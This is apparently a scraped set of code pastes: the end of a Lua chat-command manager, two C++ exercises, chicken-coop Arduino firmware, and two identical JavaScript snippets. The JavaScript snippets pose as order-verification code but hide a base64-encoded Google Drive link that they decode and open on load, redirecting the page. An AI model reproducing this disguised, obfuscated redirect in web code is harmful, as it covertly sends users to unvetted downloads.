        if cmd != CommandManager.prefixKeyword then
            return
        end

        cmd = table.remove( args, 1 ):lower()

        local i = 1
        while i <= #args do
            local quote = nil

            if string.StartsWith( args[i], [[""]] ) then
                quote = [[""]]
            elseif string.StartsWith( args[i], [[']] ) then
                quote = [[']]
            end

            if quote then
                local arg = {}
                local i2 = i
                while i2 <= #args do
                    table.insert( arg, args[i2] )

                    if string.EndsWith( args[i2], quote ) then
                        for j = i, i2 do
                            table.remove( args, i )
                        end

                        arg = table.concat( arg, ' ' )
                        table.insert( args, i, string.sub( arg, 2, #arg - 1 ) )

                        i = i2
                        break
                    end

                    i2 = i2 + 1
                end
            end

            i = i + 1
        end

        return cmd, args
    end,
    onMessage = function( ply, message, _, _, localChat )
        message = CommandManager.subPrefix( message )
        if !message then return end

        local cmd, args = CommandManager.parseArgs( message )
        local command = cmd and CommandManager.commands[cmd]

        if command then
            if command.localPlayerOnly and ply != LocalPlayer() then return end
            if command.friendsOnly and ply != LocalPlayer() and !ply:IsFriend( LocalPlayer() ) then return end

            local success, response = xpcall( command.callback, CommandManager.onError, unpack( args ) )

            if !success then
                ErrorNoHalt( response )
                response = 'Error executing command'
            end

            if response then
                if command.localPlayerOnly then
                    chat.AddText( string.format( ""You executed '%s': %s"", cmd, response ) )
                else
                    local SayFunction = localChat and SayLocal or Say
                    SayFunction( string.format( [[;""%s"" executed '%s': %s]], ply:Name(), cmd, response ) )
                end
            else
                chat.AddText( string.format( ""%s executed '%s'"", ply:Name(), cmd ) )
            end
        end
    end,
    onError = function( error )
        return error
    end,
    initHooks = function()
        hook.Add( 'OnPlayerChat', 'AokiChatCommands', CommandManager.onMessage )
    end,
}

-- CommandManager.addCommand({
--     name = 'test',
--     args = '...any args',
--     description = 'arg tester',
--     callback = function( ... )
--         PrintTable({ ... })
--     end,
-- })

local function makeFunctionName( command )
    local permittedFor

    if command.localPlayerOnly then
        permittedFor = 'owner'
    elseif command.friendsOnly then
        permittedFor = 'friends'
    else
        permittedFor = 'all'
    end

    return ""%s (%s)"" % { command.name, permittedFor }
end

CommandManager.addCommand({
    name = 'help',
    args = '[commandName]',
    description = 'displays available commands or information about a command',
    callback = function( commandName )
        if !commandName then
            local commands = {}

            for _, command in pairs( CommandManager.commands ) do
                table.insert( commands, #commands, makeFunctionName( command ) )
            end

            return table.concat( commands, ', ' )
        end

        local command = CommandManager.commands[commandName:lower()]

        if command then
            local name = makeFunctionName( command )
            return string.format( '%s %s - %s', name, command.args, command.description )
        end

        return string.format( '""%s"" command does not exist', commandName )
    end,
})

include( './color-utils.lua' )( CommandManager )
include( './text-utils.lua' )( CommandManager )
include( './find.lua' )( CommandManager )
include( './dnd.lua' )( CommandManager )
include( './include.lua' )( CommandManager )
include( './goto-and-siton.lua' )( CommandManager )
include( './apartment.lua' )( CommandManager )
include( './sit.lua' )( CommandManager )
include( './rewear.lua' )( CommandManager )

CommandManager.initHooks()
"
Xr6a6c0v,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 09:00:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70121/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Nji4cZc9,Untitled,Protyay77,C++,Sunday 13th of April 2025 08:54:54 AM CDT,"string canAllocateTasks(int K, vector<int> taskIds) {
    // Create a frequency map of taskIds
    unordered_map<int, int> freq;
    
    for (int id : taskIds) {
        freq[id]++;
    }
    
    // Check if there are more than K distinct task IDs than can be handled at once
    if (freq.size() < K) {
        return ""No"";
    }
    
    // Count how many groups can be formed
    vector<int> frequencies;
    for (const auto& entry : freq) {
        frequencies.push_back(entry.second);
    }
    
    // Sort frequencies in descending order
    sort(frequencies.rbegin(), frequencies.rend());
    
    // Check if we can group the task IDs in valid distributions
    int groups = 0;
    int currentGroup = 0;
    
    for (int i = 0; i < frequencies.size(); i++) {
        // Each group requires K distinct task IDs
        if (currentGroup < K) {
            currentGroup++;
            groups++;
        } else {
            return ""No"";  // Return No if it's not possible to make a valid distribution
        }
    }
    
    return ""Yes"";
}
"
jPmMEQL8,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 08:45:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60628/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
znvrCbA2,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 07:57:46 AM CDT,"#include <iostream>
#include <vector>
using namespace std;


int main() {
    int a, b, k;
    cin >> a >> b >> k;
    
    int sum = 0;
    for(int i = a; i <= b; i++) {
        int n = i;
        int deliteli_na_n = 0;
        bool specijalen_broj = true;
        for(int j = 1; j <= n; j++) {
            if(n % j == 0) {
                deliteli_na_n++;
            }
        }
        
        for(int j = n - 1; j >= max(n - k, 1); j--) {
            int deliteli_na_j = 0;
            
            for(int l = 1; l <= j; l++) {
                if(j % l == 0) {
                    deliteli_na_j++;
                }
            }
            
            if(deliteli_na_n <= deliteli_na_j) {
                specijalen_broj = false;
                break;
            }
            
        }
        if(specijalen_broj) {
            sum += i;
        }
    }
    cout << sum << endl;
    return 0;
}
"
VX3aRfeP,CoopCommand Wifi Rev1.2 Rev2,IGLORENZ,C++,Sunday 13th of April 2025 07:39:16 AM CDT,"//                   COOP COMMAND WI-FI V1.2 (Full Function Field Test Ready)
//              First version of Coop Command, Chicken Coop Control Software.
//
//
//                                      Component/Feature Notes:
//                          -- Photo Resistor GL5539 W/10K Divider
//                          -- Interior Temp/Humidity Sensor DHT22
//                          -- Water Temp Sensor DS18B20
//                          -- 3 User Input Buttons
//                          -- I2C Connector for 20x4 LCD Display
//                          -- User selectable settings
//                          -- WIFI Connection via ESP32-CAM serial Connection
//                          -- Settings saved in EEPROM


// Libraries
#include <EEPROM.h>
#include <DallasTemperature.h>
#include <OneWire.h>
#include <Wire.h>
#include <DHT.h>;
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27, 20, 4);          // Set I2C Address and display size

// pin assignments
const int photocellPin = A0;                 // analog input pin for photocell
const int button1 = 2;                       // pin for enter/back button
const int button2 = 3;                       // pin for user input button 1
const int button3 = 4;                       // pin for user input button 2
const int bottomSwitchPin = A2;              // bottom switch is connected to pin A2
const int topSwitchPin = A1;                 // top switch is connected to pin A1
const int directionCloseCoopDoorMotorB = 8;  // direction close motor b - pin 8
const int directionOpenCoopDoorMotorB = 6;   // direction open motor b - pin 9
const int layLightRelay = 10;                //output pin controlling lay light relay
const int fanRelay = 11;                     // output pin controlling ventilation fan relay
const int fanLED = 5;                        // output pin for ventilation fan LED indicator
const int motorLED = 7;                      // output pin for ventilation fan LED indicator
const int heatRelay = 9;                     // output pin controlling water heater relay
const int heatLED = A3;                      // output pin controlling water heater LED indicator

// Data wire is plugged into pin 12
#define ONE_WIRE_BUS 12

// Setup a oneWire instance to communicate with any OneWire devices
// (not just Maxim/Dallas temperature ICs)
OneWire oneWire(ONE_WIRE_BUS);

// Pass our oneWire reference to Dallas Temperature.
DallasTemperature sensors(&oneWire);


//DHT Setup
#define DHTPIN 13             // what pin we're connected to
#define DHTTYPE DHT22         // DHT 22  (AM2302)
DHT dht(DHTPIN, DHTTYPE);     // Initialize DHT sensor

// Menu Variables and States

// Timers
unsigned long ds18b20Delay = 2000;                //delay so sensor is read every two seconds
unsigned long lastDs18b20ReadingTime = 0;         // the last time the DS18B20 sensor was read
unsigned long dhtDelay = 2000;                    //delay so sensor is read every 2 seconds
unsigned long lastDhtReadingTime = 0;             // the last time the DHT22 was read
unsigned long layLightTimer = 36000000;           // Timer to make sure at least 14 hours or ""daylight""
unsigned long lastDayLightReadingTime = 0;        // timer to keep track of how long it has been night
unsigned long nightLightDelay = 300000;           // 5 minute timer to turn on the coop light if ""enter"" is pushed and it is night.
unsigned long lastNightLightTime = 0;             // the last time the night light button was pushed
unsigned long photocellReadingDelay = 600000;     // 600000 = 10 minute
unsigned long lastPhotocellReadingTime = 0;       // the last time the photocell was read

// Sensor Variables
bool doorOpen = true;                   // is the coop door open
bool doorClosed = false;                // is the door closed
bool doorOpenMove = false;              // is the door opening?
bool doorCloseMove = false;             // is the door closing?
int topSwitchState;                     // Current state (open/closed) of the top limit switch
int bottomSwitchState;                  // Current state (open/closed) of the bottom limit switch
bool ventOn = false;                    // is the ventilation fan relay on or off
bool heaterOn = false;                  // is the water heater relay on or off
bool nightTimer = false;                // is it night time
bool layLightOn = true;                 // is the Lay Light time monitoring system on
bool nightLightOn = false;              // is the Night Light on
int coopTemp = 0;                       // Interior Coop Temperature Reading
int closeDoor = 30;                     // Light level to close coop door (user editable, EEPROM saved)
int hotTemp = 30;                       // Temperature to turn on Ventilation Fan Relay (user editable, EEPROM saved)
int coldTemp = 3;                       // Temperature to turn on Water Heat Relay (user editable, EEPROM saved)
int waterTemp = 0;                      // Water Tempterature Reading
float hum;                              // Stores humidity value from DHT22
float temp;                             // Stores temperature value from DHT22
int photocellReading;                   // analog reading of the photocell
int photocellReadingLevel = '2';        // photocell reading levels (night, light, twilight)

// UART Communication
char camRx;                             // Command Character Received from ESP32-Cam
char coopTx;                            //Communication From Coop Command
bool newDataRx = false;                 //Has CoopCommand received a new command from the ESP32-Cam?
unsigned long serialDelay = 30000;      //delay to send coop status updates
unsigned long lastSerialSend = 0;       //the last time an update was sent


// Human Machine Interface Variables
bool menuOn = true;                     // state of the display menu
int buttonState1 = 0;                   // current state of button1
int buttonState2 = 0;                   // current state of button2
int buttonState3 = 0;                   // current state of button3
int lastButtonState1 = 0;               // previous state of button1
int lastButtonState2 = 0;               // previous state of button2
int lastButtonState3 = 0;               // previous state of button3
unsigned long displayTimer = 8000;      // timer to automatically turn off the display
unsigned long lastDisplayTimer = 0;     // last time the turn off delay was re-set
int optionSelect = 0;                   // which menu option is selected
int lastOptionSelect = 0;               // the last menu option that was selected
int lastItemSelect = 0;                 // which menu item is selected
int itemSelect = 0;                     // which menu item was selected last

//EEPROM addresses and variables

int coldTempAddress = 0;                // EEPROM address for the water heat turn on temperature
int hotTempAddress = 1;                 // EEPROM address for the ventilation fan turn on temperature
int closeDoorAddress = 2;               // EEPROM address for the door close light level



void setup() {
  // put your setup code here, to run once:
  coldTemp = EEPROM.read(0);
  hotTemp = EEPROM.read(1);
  closeDoor = EEPROM.read(2);
  dht.begin();
  sensors.begin();
  Serial.begin(115200);
  pinMode(photocellPin, INPUT);
  pinMode(button1, INPUT);
  pinMode(button2, INPUT);
  pinMode(button3, INPUT);
  pinMode(topSwitchPin, INPUT);
  pinMode(bottomSwitchPin, INPUT);
  pinMode(layLightRelay, OUTPUT);
  pinMode(fanRelay, OUTPUT);
  pinMode(fanLED, OUTPUT);
  pinMode(motorLED, OUTPUT);
  pinMode(heatLED, OUTPUT);
  pinMode(heatRelay, OUTPUT);
  pinMode(directionCloseCoopDoorMotorB, OUTPUT);
  pinMode(directionOpenCoopDoorMotorB, OUTPUT);
  lcd.begin();
  lcd.clear();
  lcd.home();
  lcd.print("" Coop Command"");
  lcd.setCursor(0, 1);
  lcd.print("" Control Center"");
  lcd.setCursor(0, 2);
  lcd.print("" WI-FI V1.2"");
  lcd.setCursor(0, 3);
  lcd.print("" LOADING..."");
  delay(2000);
  lcd.clear();
  photocellReading = analogRead(photocellPin);
}

// Function to Communicate with ESP32-CAM
void camCommand() {
  if (Serial.available() > 0) {
    camRx = Serial.read();
    newDataRx = true;
  }
  if (newDataRx == true) {
    if (camRx == 'U') { //If the ESP32 says to put the door up
      photocellReadingLevel = '3';
      lastPhotocellReadingTime = millis();
      newDataRx = false;
    }
    else if (camRx == 'D') { //If the ESP32 says to put the door down
      photocellReadingLevel = '1';
      lastPhotocellReadingTime = millis();
      newDataRx = false;
    }
  }
  if ((unsigned long)(millis() - lastSerialSend) >= serialDelay) {
    lastSerialSend = millis();
    if (doorClosed) { // If door is closed
      Serial.print('S');
    }
    else if (doorOpen) { // If door is open
      Serial.print('O');
    }
    else if (doorOpenMove) { //If door is opening
      Serial.print('U');
    }
    else if (doorCloseMove) { //If door is closing
      Serial.print('D');
    }
  }
}

// Function to Control Ventilation Fan Relay
void ventFan() {
  if ((unsigned long)(millis() - lastDhtReadingTime) >= dhtDelay) {
    lastDhtReadingTime = millis();
    hum = dht.readHumidity();
    temp = dht.readTemperature();
    coopTemp = temp;
    if (coopTemp >= hotTemp) { // if the temperature is above the Hot temperature
      digitalWrite(fanRelay, HIGH);
      digitalWrite(fanLED, HIGH);
      ventOn = true;
    }
    else if (coopTemp < (hotTemp - 2)) { // if the temperature has been lowered two degrees
      digitalWrite(fanRelay, LOW);
      digitalWrite(fanLED, LOW);
      ventOn = false;
    }
  }
}

// Function to Control LayLight and NightLight Relay
void layLight() {
  if (layLightOn) {
    if (!nightTimer) { // if it is not dark
      lastDayLightReadingTime = millis();
      digitalWrite(layLightRelay, LOW); // turn off the lay light
    }
    else if (nightTimer) { // if it is dark
      if ((unsigned long)(millis() - lastDayLightReadingTime) >= layLightTimer) { //if it has been dark more than 10 hours (or whatever the timer is
        digitalWrite(layLightRelay, HIGH); // turn on the lay light
      }
      else {
        digitalWrite(layLightRelay, LOW); // turn off the lay light
      }
    }
  }
  if (nightLightOn) { // if someone wants the light on
    digitalWrite(layLightRelay, HIGH);
  }
  else if ((unsigned long)(millis() - lastNightLightTime) >= nightLightDelay) {
    digitalWrite (layLightRelay, LOW);
    nightLightOn = false;
  }
}

// Function to Control Water Heat Relay
void waterHeat() {
  if ((unsigned long)(millis() - lastDs18b20ReadingTime) >= ds18b20Delay) {
    lastDs18b20ReadingTime = millis();
    sensors.requestTemperatures();
    waterTemp = sensors.getTempCByIndex(0);
    if (waterTemp >= (coldTemp + 3)) { // if the temperature is 3 degrees above the trigger temp
      digitalWrite(heatRelay, LOW); //turn off the water heater
      digitalWrite(heatLED, LOW); // turn off the LED indicator
      heaterOn = false;
    }
    else if (waterTemp < coldTemp) { //if the temperature is below the cold temperature
      digitalWrite(heatRelay, HIGH); //turn on the water heater
      digitalWrite(heatLED, HIGH); // turn on the LED indicator
      heaterOn = true;
    }
  }
}

// Function to Monitor Light Levels
void photoCell() { // function to be called repeatedly - per coopPhotoCellTimer set in setup
  if ((unsigned long)(millis() - lastPhotocellReadingTime) >= photocellReadingDelay) {
    photocellReading = analogRead(photocellPin);
    lastPhotocellReadingTime = millis();

    //  set photocell threshholds
    if (photocellReading >= 0 && photocellReading <= closeDoor) { // Night Setting based on user or default selected low light trigger
      photocellReadingLevel = '1';
      nightTimer = true;
    }

    else if (photocellReading  >= closeDoor && photocellReading <= 125) { // Twighlight setting
      photocellReadingLevel = '2';
      nightTimer = true;
    }

    else if (photocellReading  >= 126 ) { //Daylight Setting
      photocellReadingLevel = '3';
      nightTimer = false;
    }
  }
}


// stop the coop door motor and put the motor driver IC to sleep (power saving)
void stopCoopDoorMotorB() {
  digitalWrite (directionCloseCoopDoorMotorB, LOW);      // turn off motor close direction
  digitalWrite (directionOpenCoopDoorMotorB, LOW);       // turn off motor open direction
  digitalWrite(motorLED, LOW);
}



// close the coop door motor
void closeCoopDoorMotorB() {
  if (bottomSwitchState == 1) {                         //if the bottom reed switch is open
    digitalWrite (directionCloseCoopDoorMotorB, HIGH);     // turn on motor close direction
    digitalWrite (directionOpenCoopDoorMotorB, LOW);       // turn off motor open direction
    digitalWrite(motorLED, HIGH);
  }
  if ((bottomSwitchState == 1) && (topSwitchState == 1)) {   // if both reed switches are open
    doorCloseMove = true;
    doorOpenMove = false;
    doorOpen = false;
    doorClosed = false;
  }

  if (bottomSwitchState == 0) {                     // if bottom reed switch circuit is closed
    stopCoopDoorMotorB();
    doorOpenMove = false;
    doorCloseMove = false;
    doorOpen = false;
    doorClosed = true;
  }
}



// open the coop door
void openCoopDoorMotorB() {
  if (topSwitchState == 1) {                         //if the top reed switch is open
    digitalWrite(directionCloseCoopDoorMotorB, LOW);       // turn off motor close direction
    digitalWrite(directionOpenCoopDoorMotorB, HIGH);       // turn on motor open direction
    digitalWrite(motorLED, HIGH);
  }
  if ((bottomSwitchState == 1) && (topSwitchState == 1)) {   // if both reed switches are open
    doorCloseMove = false;
    doorOpenMove = true;
    doorOpen = false;
    doorClosed = false;
  }
  if (topSwitchState == 0) {                            // if top reed switch circuit is closed
    stopCoopDoorMotorB();
    doorOpenMove = false;
    doorCloseMove = false;
    doorOpen = true;
    doorClosed = false;
  }
}


void readSwitches() {
  topSwitchState = (digitalRead(topSwitchPin));
  bottomSwitchState = (digitalRead(bottomSwitchPin));
}

// do the coop door
void doCoopDoor() {
  if (photocellReadingLevel  == '1') {              // if it's dark
    if (photocellReadingLevel != '2') {             // if it's not twilight
      if (photocellReadingLevel != '3') {           // if it's not light
        readSwitches();
        closeCoopDoorMotorB();                      // close the door
      }
    }
  }
  else if (photocellReadingLevel  == '3') {              // if it's light
    if (photocellReadingLevel != '2') {             // if it's not twilight
      if (photocellReadingLevel != '1') {           // if it's not dark
        readSwitches();
        openCoopDoorMotorB();                       // Open the door
      }
    }
  }
  else if (photocellReadingLevel == '2') {          // if it's twilight
    if (photocellReadingLevel != '3') {             // if it's not light
      if (photocellReadingLevel != '1') {           // if it's not dark
        readSwitches();
        stopCoopDoorMotorB();
      }
    }
  }
}


void readButtons() {
  buttonState1 = (digitalRead(button1));
  buttonState2 = (digitalRead(button2));
  buttonState3 = (digitalRead(button3));
  if (buttonState1 != lastButtonState1) {
    if (buttonState1 == LOW) { //if the enter/back button has been pressed
      lastDisplayTimer = millis();
      if ((itemSelect == 0) && (optionSelect != 0)) { //if we are not in the settings change
        itemSelect = 1;
      }
      else if (itemSelect == 1) {
        itemSelect = 0;
      }
    }
    lastButtonState1 = buttonState1;
  }
  if (itemSelect == 0) { // if we are not adjusting settings

    if (buttonState3 != lastButtonState3) { //if the right button has been pressed
      if (buttonState3 == LOW) { //if the right button has been pressed
        lastDisplayTimer = millis();
        if ((optionSelect <= 5) && (optionSelect != 5)) { //if we are not past the last menu screen
          optionSelect ++;
        }
        else if (optionSelect == 5) { // if we are at the last menu screen
          optionSelect = 0;
        }
      }
      lastButtonState3 = buttonState3;
    }
    else if (buttonState2 != lastButtonState2) { //if the left button has been pressed
      if (buttonState2 == LOW) { //if the left button has been pressed
        lastDisplayTimer = millis();
        if (optionSelect > 0) { //if we are not at the first menu screen
          optionSelect --;
        }
        else if (optionSelect == 0) {
          optionSelect = 5;
        }
      }
      lastButtonState2 = buttonState2;
    }
  }

  else if (itemSelect == 1) { // if we are adjusting settings
    buttonState2 = (digitalRead(button2));
    buttonState3 = (digitalRead(button3));

    if (buttonState3 != lastButtonState3) { //if the right button has been pressed
      if (buttonState3 == LOW) { //if the right button has been pressed
        lastDisplayTimer = millis();
        if (optionSelect == 1) { //if we are adjusting the Vent Fan Temp
          hotTemp = (hotTemp + 5);
        }
        else if (optionSelect == 2) { // if we are adjusting the Water Heater Temp
          coldTemp = (coldTemp + 1);
        }
        else if (optionSelect == 3)  { // if we are adjusting the Door Light Sensor
          closeDoor = (closeDoor + 5);
        }
      }
      lastButtonState3 = buttonState3;
    }
    else if (buttonState2 != lastButtonState2) { //if the left button has been pressed
      if (buttonState2 == LOW) { //if the left button has been pressed
        lastDisplayTimer = millis();
        if (optionSelect == 1) { //if we are adjusting the Vent Fan Temp
          hotTemp = (hotTemp - 5);
        }
        else if (optionSelect == 2) { // if we are adjusting the Water Heater Temp
          coldTemp = (coldTemp - 1);
        }
        else if (optionSelect == 3)  { // if we are adjusting the Door Light Sensor
          closeDoor = (closeDoor - 5);
        }
      }
      lastButtonState2 = buttonState2;
    }
    if (optionSelect == 4) { // if we are overriding the coop door
      if (doorOpen) { // if the coop door is open
        itemSelect = 0;
        optionSelect = 0; //back to front screen
        lastPhotocellReadingTime = millis();
        lastDisplayTimer = millis();
        photocellReadingLevel = '1';

      }
      else if (!doorOpen) { //if the coop door is closed
        itemSelect = 0;
        optionSelect = 0; //back to front screen
        lastDisplayTimer = millis();
        lastPhotocellReadingTime = millis();
        photocellReadingLevel = '3';
      }
    }
    if (optionSelect == 5) { // if we are turning the laylight option on/off
      if (layLightOn) { // if the lay light option is on
        itemSelect = 0;
        optionSelect = 0; //back to front screen
        lastDisplayTimer = millis();
        layLightOn = false;
      }
      else if (!layLightOn) { //if the lay light option is off
        itemSelect = 0;
        optionSelect = 0; //back to front screen
        lastDisplayTimer = millis();
        layLightOn = true;
      }
    }
  }
}

void displayMenu() {
  if (menuOn) { // if the display is supposed to be on
    lcd.display(); // turn the display on
    lcd.backlight();

    if (optionSelect != lastOptionSelect) {
      lcd.clear();
      lastOptionSelect = optionSelect;
    }
    if (itemSelect != lastItemSelect) {
      lcd.clear();
      lastItemSelect = itemSelect;
    }

    switch (optionSelect) {

      case 0:
        lcd.home();
        lcd.print(""    Coop Command"");
        lcd.setCursor(0, 1);
        lcd.print(""<                  >"");
        lcd.setCursor(0, 2);
        lcd.print(""   Control Center"");
        lcd.setCursor(0, 3);
        lcd.print(""WI-FI Firmware V1.2"");
        break;

      case 1:
        if (itemSelect == 0 && ventOn == false) {
          lcd.home();
          lcd.print(""  Coop Temp: "");
          lcd.print(coopTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(0, 2);
          lcd.print(""  Ventilation Fan: "");
          lcd.setCursor(7, 3);
          lcd.print(""OFF"");
        }
        if (itemSelect == 0 && ventOn == true) {
          lcd.home();
          lcd.print(""  Coop Temp: "");
          lcd.print(coopTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(0, 2);
          lcd.print(""  Ventilation Fan: "");
          lcd.setCursor(7, 3);
          lcd.print("" ON"");
        }
        if (itemSelect == 1) {
          lcd.home();
          lcd.print(""  Coop Temp: "");
          lcd.print(coopTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(1, 2);
          lcd.print(""Fan On Temp: "");
          lcd.print(hotTemp);
          lcd.print("" C"");
        }
        break;

      case 2:
        if (itemSelect == 0 && heaterOn == false) {
          lcd.home();
          lcd.print(""  Water Temp: "");
          lcd.print(waterTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(4, 2);
          lcd.print(""Water Heat: "");
          lcd.setCursor(7, 3);
          lcd.print(""OFF"");
        }
        if (itemSelect == 0 && heaterOn == true) {
          lcd.home();
          lcd.print(""  Water Temp: "");
          lcd.print(waterTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(4, 2);
          lcd.print(""Water Heat: "");
          lcd.setCursor(7, 3);
          lcd.print(""ON"");
        }
        if (itemSelect == 1) {
          lcd.home();
          lcd.print(""  Water Temp: "");
          lcd.print(waterTemp);
          lcd.print("" C"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(1, 2);
          lcd.print(""Heat On Temp: "");
          lcd.print(coldTemp);
          lcd.print("" C"");
        }
        break;

      case 3:
        if (itemSelect == 0 && doorOpen == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""OPEN"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(3, 2);
          lcd.print(""Light Value: "");
          lcd.setCursor(7, 3);
          lcd.print(photocellReading);
        }
        if (itemSelect == 0 && doorClosed == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""CLOSED"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(3, 2);
          lcd.print(""Light Value: "");
          lcd.setCursor(7, 3);
          lcd.print(photocellReading);
        }
        if (itemSelect == 0 && doorOpenMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""OPENING"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(3, 2);
          lcd.print(""Light Value: "");
          lcd.setCursor(7, 3);
          lcd.print(photocellReading);
        }
         if (itemSelect == 0 && doorCloseMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""CLOSING"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(3, 2);
          lcd.print(""Light Value: "");
          lcd.setCursor(7, 3);
          lcd.print(photocellReading);
        }
         if (itemSelect == 1 && doorOpen == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""OPEN"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(2, 2);
          lcd.print(""Light Adjust: "");
          lcd.print(closeDoor);
        }
         if (itemSelect == 1 && doorClosed == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""CLOSED"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(2, 2);
          lcd.print(""Light Adjust: "");
          lcd.print(closeDoor);
        }
         if (itemSelect == 1 && doorOpenMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""OPENING"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(2, 2);
          lcd.print(""Light Adjust: "");
          lcd.print(closeDoor);
        }
         if (itemSelect == 1 && doorCloseMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""CLOSING"");
          lcd.setCursor(0, 1);
          lcd.print(""<                  >"");
          lcd.setCursor(2, 2);
          lcd.print(""Light Adjust: "");
          lcd.print(closeDoor);
        }
        break;

      case 4:
        if (itemSelect == 0 && doorOpen == true) {
          lcd.home();
          lcd.print(""  Door OVERRIDE:"");
          lcd.setCursor(0, 1);
          lcd.print(""<     OPEN         >"");
          lcd.setCursor(0, 3);
          lcd.print(""Click ENTER to Close"");
        }
         if (itemSelect == 0 && doorClosed == true) {
          lcd.home();
          lcd.print(""  Door OVERRIDE:"");
          lcd.setCursor(0, 1);
          lcd.print(""<     CLOSED       >"");
          lcd.setCursor(0, 3);
          lcd.print(""Click ENTER to Open"");
        }
         if (itemSelect == 0 && doorCloseMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""CLOSING"");
        }
         if (itemSelect == 0 && doorOpenMove == true) {
          lcd.home();
          lcd.print(""  Coop Door: "");
          lcd.print(""OPENING"");
        }
        break;

      case 5:
        if (itemSelect == 0 && layLightOn == true) {
          lcd.home();
          lcd.print(""  LayLight Timer:"");
          lcd.setCursor(0, 1);
          lcd.print(""<      ON          >"");
          lcd.setCursor(0, 3);
          lcd.print(""  ENTER to turn OFF"");
        }
        if (itemSelect == 0 && layLightOn == false) {
          lcd.home();
          lcd.print(""  LayLight Timer:"");
          lcd.setCursor(0, 1);
          lcd.print(""<     OFF         >"");
          lcd.setCursor(0, 3);
          lcd.print(""  ENTER to turn ON"");
        }
        break;
    }

    if ((unsigned long)(millis() - lastDisplayTimer) >= displayTimer) {
      menuOn = false;
    }
  }
  if (!menuOn) { // if the display is supposed to be off
    lcd.noDisplay(); // turn the display off
    lcd.noBacklight();
    optionSelect = 0; //back to front screen
    itemSelect = 0;
  }
  if ((buttonState1 == 0) && (!menuOn)) {
    menuOn = true;
    lastDisplayTimer = millis();
    optionSelect = 0; //back to front screen
    itemSelect = 0;
    if (nightTimer) {
      nightLightOn = true;
      lastNightLightTime = millis();
    }
  }
}

void settingSave() {
  EEPROM.update(hotTempAddress, hotTemp);
  EEPROM.update(coldTempAddress, coldTemp);
  EEPROM.update(closeDoorAddress, closeDoor);
}

void humanInterface() {
  readButtons();
  displayMenu();
  camCommand();
}

void coopOperation() {
  settingSave();
  ventFan();
  photoCell();
  doCoopDoor();
  waterHeat();
  layLight();
}

void loop() {

  humanInterface();
  coopOperation();
}"
